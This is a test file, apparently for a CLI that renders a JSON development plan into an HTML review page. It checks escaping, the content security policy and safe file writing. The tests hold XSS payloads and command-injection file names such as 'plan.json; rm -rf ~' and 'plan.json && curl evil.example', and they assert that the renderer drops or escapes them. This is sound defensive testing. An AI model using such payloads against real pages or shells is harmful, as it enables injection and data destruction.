import { describe, expect, test } from 'bun:test'
import { mkdir, mkdtemp, readFile, symlink, writeFile } from 'node:fs/promises'
import { readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { planDiagram } from '../src/plan/diagram'
import {
  buildPlanPayload,
  escapeJsonForScript,
  planBreakingChanges,
  planLinks,
  planTemplatePath,
  renderPlanHtml,
  type PlanPagePayload,
} from '../src/plan/render'
import { PlanDraftSchema, PlanSchema, type PlanDraft } from '../src/plan/schema'
import { parsePlanDocument, planOutputPath, renderPlanFile } from '../src/plan-render'
import { loadCommentsPlan, TEST_BASELINE } from './plan-fixture'

function draft(): PlanDraft {
  return PlanDraftSchema.parse(loadCommentsPlan())
}

/**
 * The page's data block, taken out of the rendered document the way a consumer
 * would. Asserting on this string rather than on the whole file is what lets the
 * escaping tests fail: the document's own script and style are full of `<` and `&`.
 */
function dataBlock(html: string): string {
  const opening = '<script type="application/json" id="plan-data">'
  const start = html.indexOf(opening)
  expect(start).toBeGreaterThan(-1)
  const end = html.indexOf('</script>', start)
  expect(end).toBeGreaterThan(start)
  return html.slice(start + opening.length, end)
}

/** The page's data block, parsed back: what the page will actually read. */
function payloadOf(input: Parameters<typeof renderPlanHtml>[0]): PlanPagePayload {
  return JSON.parse(dataBlock(renderPlanHtml(input)))
}

/**
 * A plan whose every free-text field carries one hostile string, parsed the way the
 * command parses one: a payload the schema would reject reaches no user either.
 */
function hostilePlan(payload: string): PlanDraft {
  const fixture = draft()
  return PlanDraftSchema.parse({
    ...fixture,
    title: payload,
    summary: payload,
    scope: { goals: [payload], nonGoals: [payload] },
    assumptions: [payload],
    hints: [payload],
    questions: fixture.questions.map((question) => ({
      ...question,
      question: payload,
      options: question.options.map(() => ({ label: payload, consequence: payload })),
      assumed: payload,
    })),
    models: fixture.models.map((model) => ({ ...model, fillable: [payload] })),
    views: fixture.views.map((view) => ({
      ...view,
      purpose: payload,
      actions: view.actions.map((action) => ({ ...action, label: payload })),
      states: { empty: payload, error: payload, loading: payload },
    })),
    controllers: fixture.controllers.map((controller) => ({
      ...controller,
      actions: controller.actions.map((action) => ({ ...action, rules: [payload] })),
    })),
    tasks: fixture.tasks.map((task) => ({
      ...task,
      summary: payload,
      acceptance: task.acceptance.map((acceptance) => ({ ...acceptance, description: payload, given: [payload] })),
    })),
  })
}

const PAYLOADS = [
  '</script><script>alert(1)</script>',
  '<!--',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  'line\u2028separator\u2029paragraph',
  'dollars: $` and $& and $\' and $0',
  ']]>',
  '&lt;&amp;&gt;',
]

describe('renderPlanHtml', () => {
  test('should embed the payload so that it parses back to the plan it was given', () => {
    const plan = draft()

    const embedded = payloadOf({ plan })

    expect(embedded.plan).toEqual(plan)
  })

  test('should round-trip a plan whose strings are hostile', () => {
    for (const payload of PAYLOADS) {
      const plan = hostilePlan(payload)

      const embedded = payloadOf({ plan })

      expect(embedded.plan).toEqual(plan)
    }
  })

  test('should write no raw markup character into the data block', () => {
    for (const payload of PAYLOADS) {
      const block = dataBlock(renderPlanHtml({ plan: hostilePlan(payload) }))

      expect(block).not.toContain('<')
      expect(block).not.toContain('>')
      expect(block).not.toContain('&')
      expect(block).not.toContain('\u2028')
      expect(block).not.toContain('\u2029')
    }
  })

  test('should leave no closing script tag anywhere in the document', () => {
    const html = renderPlanHtml({ plan: hostilePlan('</script ><script>alert(1)</script>') })

    // The page's own three closing tags (theme, data, behaviour), and no fourth.
    expect(html.match(/<\/script/g)).toHaveLength(3)
  })

  test('should not expand a replacement pattern the plan spells', () => {
    const payload = 'before $` middle $& after $\''

    const embedded = payloadOf({ plan: hostilePlan(payload) })

    expect(embedded.plan.title).toBe(payload)
  })

  test('should render a draft with no plan hash', () => {
    const embedded = payloadOf({ plan: draft() })

    expect(embedded.planHash).toBeNull()
  })

  test('should render the plan hash once the plan carries a baseline', () => {
    const plan = PlanSchema.parse({ ...loadCommentsPlan(), baseline: TEST_BASELINE })

    const embedded = payloadOf({ plan })

    expect(embedded.planHash).toMatch(/^[0-9a-f]{64}$/)
  })

  test('should render nothing for an absent status', () => {
    const embedded = payloadOf({ plan: draft() })

    expect(embedded.status).toBeNull()
  })

  test('should carry check results that name the element they concern', () => {
    const checks = [
      {
        key: 'plan-route-action',
        title: 'Route action',
        status: 'fail' as const,
        message: 'route.comments.store names no action',
        elementId: 'route.comments.store',
      },
    ]

    const embedded = payloadOf({ plan: draft(), checks })

    expect(embedded.checks).toEqual(checks)
  })

  test('should carry no checks when none are given', () => {
    const embedded = payloadOf({ plan: draft() })

    expect(embedded.checks).toEqual([])
  })
})

describe('the plan file name the page prints in a command', () => {
  test('should carry a plain name through', () => {
    expect(payloadOf({ plan: draft(), planFile: 'comments.plan.json' }).planFile).toBe('comments.plan.json')
  })

  test('should be absent when none is given', () => {
    expect(payloadOf({ plan: draft() }).planFile).toBeNull()
  })

  test.each([
    'plan.json; rm -rf ~',
    'plan.json && curl evil.example',
    '$(id).json',
    '`id`.json',
    "plan'.json",
    'plan".json',
    'plan .json',
    '../secrets.json',
    '/etc/passwd',
    '-rf',
    '',
  ])('should drop %p, which the page would otherwise print for someone to paste', (name) => {
    // The command line is shown to be copied into a shell, so the name in it is held
    // to a bare file name rather than merely escaped for HTML.
    expect(payloadOf({ plan: draft(), planFile: name }).planFile).toBeNull()
  })

  test('should be printed by the page as the revise command', () => {
    const html = renderPlanHtml({ plan: draft(), planFile: 'comments.plan.json' })

    expect(html).toContain("'bunx guren plan --revise ' + (data.planFile || '<plan.json>')")
  })
})

describe('escapeJsonForScript', () => {
  test('should escape every character that could close the block or break a line', () => {
    expect(escapeJsonForScript('"</a>&\u2028\u2029"')).toBe('"\\u003c/a\\u003e\\u0026\\u2028\\u2029"')
  })

  test('should leave the value JSON.parse reads back unchanged', () => {
    const value = { text: '</script><!-- & \u2028' }

    expect(JSON.parse(escapeJsonForScript(JSON.stringify(value)))).toEqual(value)
  })
})

describe('the plan template', () => {
  const source = readFileSync(planTemplatePath(), 'utf8')

  test.each([
    'innerHTML',
    'outerHTML',
    'insertAdjacentHTML',
    'document.write',
    'eval(',
    'new Function',
    'createContextualFragment',
    'srcdoc',
  ])('should use no %s sink', (sink) => {
    expect(source).not.toContain(sink)
  })

  /**
   * The policy as the browser reads it, not as the file spells it. A comment explaining
   * the policy contains the same words, and `toContain` on the whole source was
   * satisfied by that comment while the real directive said something else.
   */
  const policy = (() => {
    const match = source.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]+)"/)
    if (!match) throw new Error('the page declares no content security policy')
    return match[1].split(';').map((directive) => directive.trim())
  })()

  test.each([
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    'img-src data:',
    "form-action 'none'",
    "base-uri 'none'",
    "require-trusted-types-for 'script'",
  ])('should declare %s and nothing wider', (directive) => {
    expect(policy).toContain(directive)
  })

  test('should load nothing over the network', () => {
    expect(source).not.toMatch(/(src|href)\s*=\s*["']https?:/)
    // A stylesheet reaches the network through `url()`, which no attribute pattern sees.
    // Guren UI's own sheet loads its fonts that way, so this is the copy-paste to catch.
    expect(source).not.toMatch(/url\(\s*["']?(https?:)?\/\//)
    expect(source).not.toContain('fetch(')
    expect(source).not.toContain('XMLHttpRequest')
  })

  test('should carry the data placeholder exactly once', () => {
    expect(source.match(/__GUREN_PLAN_DATA__/g)).toHaveLength(1)
  })

  test('should build every id-keyed map through one factory', () => {
    // A list of this file's variable names is an open roster: it grows whenever someone
    // edits the page, and a map added without a row would be unguarded. One factory is a
    // closed rule, so this assertion covers maps nobody has written yet.
    expect(source.match(/Object\.create\(null\)/g)).toHaveLength(1)
    expect(source).toContain('function idMap() {')
  })

  test('should hold the answers it exports in a list, not a map keyed by question id', () => {
    // Two questions may declare one id; a map would keep one and lose the other's answer.
    expect(source).toContain('var answers = []')
  })

  // `assets/`, not `templates/`: nothing copies this page into an application, and
  // CLAUDE.md's scaffold-template gates key on `packages/cli/templates/**`.
  test('should resolve from the directory the published package ships', () => {
    const manifest = JSON.parse(readFileSync(join(import.meta.dir, '../package.json'), 'utf8'))

    expect(planTemplatePath()).toBe(join(import.meta.dir, '..', 'assets', 'plan', 'index.html'))
    expect(manifest.files).toContain('assets')
  })
})

describe('a plan whose ids name Object.prototype members', () => {
  /**
   * Not parsed: the schema refuses these ids (the test below), and this is the page's
   * own half of that rule. `renderPlanHtml()` is a pure function anyone may call with a
   * document that never reached `PlanDraftSchema`, so the page keeps its null-prototype
   * maps whatever the schema does.
   */
  function shadowingPlan(): PlanDraft {
    // Parsed first so the defaulted sections are there, then renamed: parsing afterwards
    // is what the schema now refuses.
    const raw = JSON.stringify(draft())
      .replaceAll('model.post', 'constructor')
      .replaceAll('route.comments.store', 'toString')
      .replaceAll('validator.comment', 'hasOwnProperty')
    return JSON.parse(raw) as PlanDraft
  }

  test('should be refused by the schema, which is the first of the two defences', () => {
    expect(PlanDraftSchema.safeParse(shadowingPlan()).success).toBe(false)
  })

  test('should keep every link, so the page indexes them like any other id', () => {
    const links = planLinks(shadowingPlan())

    expect(links).toContainEqual({ from: 'toString', to: 'action.comments.store', label: 'action' })
    expect(links).toContainEqual({ from: 'action.comments.store', to: 'hasOwnProperty', label: 'body' })
  })

  test('should draw the foreign key to a model whose id shadows a prototype member', () => {
    expect(planDiagram(shadowingPlan()).edges).toContainEqual({
      id: 'fk:column.comment.postId',
      from: 'model.comment',
      to: 'constructor',
      label: 'postId',
      kind: 'foreignKey',
    })
  })

  test('should render and round-trip', () => {
    const plan = shadowingPlan()

    expect(payloadOf({ plan }).plan).toEqual(plan)
  })
})

describe('planLinks', () => {
  test('should link a route to its action and an action to its validator', () => {
    const links = planLinks(draft())

    expect(links).toContainEqual({ from: 'route.comments.store', to: 'action.comments.store', label: 'action' })
    expect(links).toContainEqual({ from: 'action.comments.store', to: 'validator.comment', label: 'body' })
  })

  test('should link a view form to the route it submits to', () => {
    const links = planLinks(draft())

    expect(links).toContainEqual({ from: 'view.posts.show', to: 'route.comments.store', label: 'submits to' })
  })

  test('should drop a reference to an id the plan does not declare', () => {
    const plan = draft()
    plan.routes[0].action = 'action.nowhere'

    expect(planLinks(plan).some((link) => link.to === 'action.nowhere')).toBe(false)
  })
})

describe('planDiagram', () => {
  test('should draw one table per model with its columns', () => {
    const diagram = planDiagram(draft())

    expect(diagram.tables.map((table) => table.table)).toEqual(['posts', 'comments'])
    expect(diagram.tables[1].columns.map((column) => column.name)).toEqual(['id', 'body', 'postId', 'createdAt'])
  })

  test('should draw a foreign key as an edge between the two models', () => {
    const diagram = planDiagram(draft())

    expect(diagram.edges).toContainEqual({
      id: 'fk:column.comment.postId',
      from: 'model.comment',
      to: 'model.post',
      label: 'postId',
      kind: 'foreignKey',
    })
  })

  test('should not draw a relationship that mirrors a foreign key twice', () => {
    const diagram = planDiagram(draft())

    expect(diagram.edges.filter((edge) => edge.kind === 'relationship')).toEqual([])
  })

  test('should skip a foreign key to a model the plan does not declare', () => {
    const plan = draft()
    plan.models = plan.models.filter((model) => model.id !== 'model.post')

    const diagram = planDiagram(plan)

    expect(diagram.edges).toEqual([])
    expect(diagram.tables[0].columns.find((column) => column.name === 'postId')?.referencesModel).toBe('model.post')
  })
})

describe('planBreakingChanges', () => {
  test('should find nothing breaking in an additive plan', () => {
    expect(planBreakingChanges(draft())).toEqual([])
  })

  test('should flag a dropped column', () => {
    const plan = draft()
    plan.models[1].columns[1].change = { kind: 'drop', reason: 'unused' }

    expect(planBreakingChanges(plan)).toContainEqual({
      elementId: 'column.comment.body',
      section: 'columns',
      title: 'comments.body',
      reason: 'The column is dropped.',
    })
  })

  test('should flag a renamed route', () => {
    const plan = draft()
    plan.routes[0].change = { kind: 'rename', from: 'comments.create' }

    expect(planBreakingChanges(plan).map((item) => item.elementId)).toContain('route.comments.store')
  })

  test('should flag an altered route that publishes an agent tool', () => {
    const plan = draft()
    plan.routes[0].change = { kind: 'alter' }
    plan.routes[0].agent = { toolName: 'comments_store', readOnly: false }

    expect(planBreakingChanges(plan).map((item) => item.reason)).toContain(
      'The published agent tool comments_store changes.',
    )
  })
})

describe('buildPlanPayload', () => {
  test('should attribute an element to the entity whose task covers it', () => {
    const payload = buildPlanPayload({ plan: draft() })

    const route = payload.elements.find((element) => element.id === 'route.comments.store')
    expect(route?.entity).toBe('Comment')
    expect(payload.entities).toEqual(['Comment'])
  })

  test('should attribute a column to its model', () => {
    const payload = buildPlanPayload({ plan: draft() })

    expect(payload.elements.find((element) => element.id === 'column.comment.body')?.entity).toBe('Comment')
  })

  test('should offer an entity the models name even when no task covers them', () => {
    const plan = draft()
    plan.tasks = []

    expect(buildPlanPayload({ plan }).entities).toEqual(['Comment', 'Post'])
  })

  test('should list every element the plan declares', () => {
    const payload = buildPlanPayload({ plan: draft() })

    expect(payload.elements.map((element) => element.id)).toContain('AC-comments-1')
    expect(payload.elements.map((element) => element.id)).toContain('Q-delete')
  })
})

describe('renderPlanFile', () => {
  async function fixtureDir(document: unknown = loadCommentsPlan()): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), 'guren-plan-render-'))
    await writeFile(join(dir, 'comments.plan.json'), JSON.stringify(document), 'utf8')
    return dir
  }

  test('should write the page beside the plan', async () => {
    const dir = await fixtureDir()

    const result = await renderPlanFile(join(dir, 'comments.plan.json'))

    expect(result.path).toBe(join(dir, 'comments.plan.html'))
    expect(await readFile(result.path, 'utf8')).toContain('plan-data')
  })

  test('should write to the path -o names', async () => {
    const dir = await fixtureDir()

    const result = await renderPlanFile(join(dir, 'comments.plan.json'), { output: join(dir, 'review.html') })

    expect(result.path).toBe(join(dir, 'review.html'))
  })

  test('should resolve a relative output against the working directory it is given', async () => {
    const dir = await fixtureDir()

    const result = await renderPlanFile(join(dir, 'comments.plan.json'), { output: 'review.html', cwd: dir })

    expect(result.path).toBe(join(dir, 'review.html'))
  })

  test('should refuse to write the page over the plan it is reading', async () => {
    const dir = await fixtureDir()
    const planPath = join(dir, 'comments.plan.json')

    await expect(renderPlanFile(planPath, { output: planPath })).rejects.toThrow(/over the plan itself/)
    // The plan is the input every later step reads, and nothing here keeps a copy.
    expect(JSON.parse(await readFile(planPath, 'utf8')).planVersion).toBe(1)
  })

  test('should refuse it by identity, not by spelling', async () => {
    const dir = await fixtureDir()
    const planPath = join(dir, 'comments.plan.json')
    const alias = join(dir, 'alias.plan.json')
    await symlink(planPath, alias)

    await expect(renderPlanFile(planPath, { output: alias })).rejects.toThrow(/over the plan itself/)
    expect(JSON.parse(await readFile(planPath, 'utf8')).planVersion).toBe(1)
  })

  test('should name the path when it cannot be written to', async () => {
    const dir = await fixtureDir()
    await mkdir(join(dir, 'out'))

    await expect(renderPlanFile(join(dir, 'comments.plan.json'), { output: join(dir, 'out') })).rejects.toThrow(
      /Cannot write the page to .*out/,
    )
  })

  test('should report a schema failure with the path that failed', async () => {
    const dir = await fixtureDir({ ...loadCommentsPlan(), title: 42 })

    await expect(renderPlanFile(join(dir, 'comments.plan.json'))).rejects.toThrow(/title/)
  })

  test('should report a file that is not JSON', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'guren-plan-render-'))
    await writeFile(join(dir, 'comments.plan.json'), 'not json', 'utf8')

    await expect(renderPlanFile(join(dir, 'comments.plan.json'))).rejects.toThrow(/not valid JSON/)
  })

  test('should report a plan that is not there', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'guren-plan-render-'))

    await expect(renderPlanFile(join(dir, 'missing.plan.json'))).rejects.toThrow(/Cannot read the plan/)
  })

  test('should name every id the plan declares twice', async () => {
    const fixture = loadCommentsPlan()
    const models = fixture.models as Array<{ id: string }>
    models[1].id = models[0].id
    const dir = await fixtureDir(fixture)

    const result = await renderPlanFile(join(dir, 'comments.plan.json'))

    expect(result.duplicateIds).toEqual(['model.post'])
  })
})

describe('parsePlanDocument', () => {
  test('should accept a draft that carries no baseline', () => {
    expect(parsePlanDocument(loadCommentsPlan())).toMatchObject({ title: 'Comments on posts' })
  })

  test('should hold a document with a baseline to the full plan schema', () => {
    expect(() => parsePlanDocument({ ...loadCommentsPlan(), baseline: { rev: '' } })).toThrow(/baseline/)
  })
})

describe('planOutputPath', () => {
  test('should replace a .json extension', () => {
    expect(planOutputPath('/tmp/comments.plan.json')).toBe('/tmp/comments.plan.html')
  })

  test('should append to a path with no .json extension', () => {
    expect(planOutputPath('/tmp/plan')).toBe('/tmp/plan.html')
  })
})
